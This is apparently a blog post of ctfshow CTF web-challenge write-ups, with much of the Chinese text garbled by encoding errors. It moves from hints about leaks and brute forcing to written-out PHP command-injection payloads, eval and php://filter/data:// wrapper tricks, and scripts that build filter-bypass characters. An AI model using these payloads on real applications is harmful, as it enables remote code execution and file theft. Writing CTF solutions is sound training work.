      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Walineï¼š</span>
  
    <a title="waline" href="/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>36 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>ä¸€äº›å…³äºåšctfshowå†™ä¸‹æ¥çš„wp</p>
<span id="more"></span>

<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤</span><br></pre></td></tr></table></figure>

<p>ç‰¹åˆ«ç®€å•çš„ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒF12å°±æœ‰flagäº†ã€‚</p>
<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</span><br></pre></td></tr></table></figure>

<p>ä»åˆ«çš„åœ°æ–¹è¿›åˆ°F12å°±è¡Œäº†</p>
<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…å°±è¡Œ</p>
<h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</span><br></pre></td></tr></table></figure>

<h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<h1 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</span><br></pre></td></tr></table></figure>

<p>.gitæ³„éœ²</p>
<h1 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</span><br></pre></td></tr></table></figure>

<p>.svnæ³„éœ²</p>
<h1 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</span><br></pre></td></tr></table></figure>

<p>index.php.swp</p>
<h1 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</span><br></pre></td></tr></table></figure>

<h1 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h1><p>åŸŸåtxtè®°å½•</p>
<h1 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„è´¦å·å¯†ç </p>
<h1 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </span><br></pre></td></tr></table></figure>

<p>éšè—çš„å¯ç‚¹å‡»</p>
<h1 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°æ–‡ä»¶ä½ç½®</p>
<h1 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</span><br></pre></td></tr></table></figure>

<p>ç¤¾å·¥æ‰¾qqæ‰€åœ¨åœ°</p>
<h1 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</span><br></pre></td></tr></table></figure>

<p>phpæ¢é’ˆï¼Œç”¨äºè‡ªå·±æ­å»ºæœåŠ¡å™¨æ—¶å€™çš„æ¢æµ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒå¯ŸPHPæ¢é’ˆphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ /tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆï¼Œç„¶åæŸ¥çœ‹phpinfoæœç´¢flag</span><br></pre></td></tr></table></figure>

<h1 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰¾æ•°æ®åº“æ–‡ä»¶å³å¯</p>
<h1 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</span><br></pre></td></tr></table></figure>

<p>JSæ–‡ä»¶æºä»£ç æŸ¥çœ‹</p>
<h1 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥F12çœ‹æºç </p>
<h1 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰¾æ•°æ®åº“æ–‡ä»¶</p>
<h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</span><br></pre></td></tr></table></figure>

<p>å°±æ­£å¸¸çš„çˆ†ç ´ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ª</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-01-24/d6decdac4d2f159a3afe68e3d12ab18b--fcc0--image-20240124141403573.png" alt="image-20240124141403573"></p>
<h1 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå</span><br></pre></td></tr></table></figure>

<p> å­åŸŸåçˆ†ç ´å³å¯</p>
<h1 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„phpä¸­çš„md5çˆ†ç ´</p>
<h1 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ä¸ªğŸ”¨</span><br></pre></td></tr></table></figure>

<p>éšæœºæ•°çˆ†ç ´ï¼Œç§å­éƒ½ç»™äº†ï¼Œç›´æ¥è‡ªå·±æœ¬åœ°è¿è¡Œä¸€ä¸‹å³å¯</p>
<h1 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†</span><br></pre></td></tr></table></figure>

<p>åéš¾ï¼Œä½¿ç”¨php_mt_seedå»ç ´è§£å¾—åˆ°seedä»è€Œå¾—åˆ°flagæœ€åã€‚</p>
<h1 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªå¯ä»¥çˆ†</span><br></pre></td></tr></table></figure>

<p>æš´åŠ›ç ´è§£ï¼Œä¸è¿‡å…¨ç©ºè¿™é¢˜ä¹Ÿèƒ½æœ‰flag</p>
<h1 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥èº«ä»½è¯æ—¥æœŸçˆ†ç ´</p>
<h1 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤§æµ·æé’ˆ</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çˆ†ç ´å³å¯</p>
<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥*ï¼Œæˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure>

<h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸Šé¢çš„echoè¿˜æ˜¯å¯ä»¥çš„æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_POST[0]);</span><br></pre></td></tr></table></figure>

<h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><p>è¿˜æ˜¯å¯ä»¥ä½¿ç”¨postæˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo`tac%09fl*`;</span><br></pre></td></tr></table></figure>

<h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;echo 1;&quot;); </span><br><span class="line">eval(&quot;echo 1?&gt;&quot;);</span><br><span class="line">åˆ†å·å¯ä»¥ç”±?&gt;ä»£æ›¿</span><br></pre></td></tr></table></figure>

<h1 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h1><p>æŠŠä¸Šé¢˜çš„urlå‚æ•°æ¢æˆä¸€ä¸ªæ•°å­—å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$nice=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h1><p>åŒä¸Šå³å¯</p>
<h1 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h1><p>åŒä¸Šå³å¯</p>
<h1 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h1><p>åŒä¸Šå³å¯ï¼Œ0æ”¹æˆaå°±è¡Œ</p>
<h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><p>base64ç¼–ç å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<p>å·²ç»å°†phpè¯­å¥é—­åˆäº†ï¼Œåé¢åŠ .phpæ²¡æœ‰ä»»ä½•ç”¨</p>
<h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line">pos()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line">array_reverse()ï¼šæ•°ç»„é€†åº </span><br><span class="line">scandir()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">next()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ é¦–å…ˆé€šè¿‡</span><br><span class="line">pos(localeconv())å¾—åˆ°ç‚¹å·ï¼Œå› ä¸ºscandir(â€™.â€™)è¡¨ç¤ºå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥scandir(pos(localeconv()))å°±èƒ½å¾—åˆ°flag.phpäº†ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±è·å¾—åˆ°äº†flagï¼Œæ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</p>
<h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p>è¿™é¢˜å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾åˆ°èƒ½å¤Ÿé€šè¿‡æˆ–æ“ä½œè·å¾—ç›¸åº”çš„å­—ç¬¦</p>
<p>phpç‰ˆï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>pyç‰ˆï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(i),re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(j),re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span>+ a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰‹åŠ¨æˆ–è€…pythonè‡ªåŠ¨å»æ‹¼æ¥éƒ½è¡Œ</p>
<h1 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h1><p>æ— å›æ˜¾</p>
<p>ç›´æ¥ç®¡é“ç¬¦æˆ–è€…æ¢è¡Œç»•è¿‡</p>
<p>è¦è®©å‘½ä»¤å›æ˜¾ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤åˆ†éš”ï¼Œä»¥æ­¤æ¥ç»•è¿‡ï¼š</p>
